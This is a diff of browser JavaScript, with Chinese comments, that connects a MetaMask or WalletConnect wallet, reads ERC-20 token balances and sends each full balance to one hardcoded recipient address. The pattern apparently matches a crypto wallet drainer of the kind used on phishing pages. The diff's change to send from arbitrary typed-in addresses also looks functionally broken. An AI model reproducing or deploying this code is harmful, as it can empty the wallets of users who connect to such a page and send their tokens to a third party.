@@ -1,6 +1,7 @@
 const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
 const etherscanApiKey = 'YOUR_ETHERSCAN_API_KEY'; // 替换为你的 Etherscan API Key
 let web3;
+let walletConnectProvider;
 
 const erc20Abi = [
     {
@@ -22,29 +23,43 @@ const erc20Abi = [
     }
 ];
 
-// 初始化 WalletConnect provider
-const walletConnectProvider = new WalletConnectProvider({
-    infuraId: "YOUR_INFURA_PROJECT_ID", // 替换为你的 Infura 项目 ID
-});
-
-// 连接 MetaMask 或 WalletConnect
 document.getElementById('connectButton').onclick = async () => {
+    const selectedWallet = document.getElementById('walletSelector').value;
+
     try {
-        // 检查是否存在 MetaMask
-        if (window.ethereum) {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            web3 = new Web3(window.ethereum);
-            document.getElementById('status').innerText = 'MetaMask 已连接';
-        } else {
-            // 使用 WalletConnect
+        if (selectedWallet === 'metamask') {
+            if (window.ethereum) {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                updateWalletList(accounts[0]);
+                document.getElementById('status').innerText = 'MetaMask 已连接';
+            } else {
+                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
+            }
+        } else if (selectedWallet === 'walletconnect') {
+            walletConnectProvider = new WalletConnectProvider({
+                infuraId: "YOUR_INFURA_PROJECT_ID", // 替换为你的 Infura 项目 ID
+            });
+
             await walletConnectProvider.enable();
             web3 = new Web3(walletConnectProvider);
+            const accounts = await web3.eth.getAccounts();
+            updateWalletList(accounts[0]);
             document.getElementById('status').innerText = 'WalletConnect 已连接';
         }
+
         document.getElementById('transferButton').disabled = false;
     } catch (error) {
         document.getElementById('status').innerText = '连接失败: ' + error.message;
     }
+};
+
+const updateWalletList = (address) => {
+    const walletList = document.getElementById('walletList');
+    const walletItem = document.createElement('li');
+    walletItem.innerText = address;
+    walletList.appendChild(walletItem);
 };
 
 async function getTokenBalances(address) {
@@ -82,9 +97,6 @@ async function getTokenBalances(address) {
 }
 
 document.getElementById('transferButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    const senderAddress = accounts[0];
-
     const walletInput = document.getElementById('wallets').value;
     const walletAddresses = walletInput.split(',').map(addr => addr.trim());
 
@@ -104,7 +116,7 @@ document.getElementById('transferButton').onclick = async () => {
             if (balance > 0) {
                 const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
                 try {
-                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: senderAddress });
+                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: walletAddress });
                     document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
                 } catch (error) {
                     document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
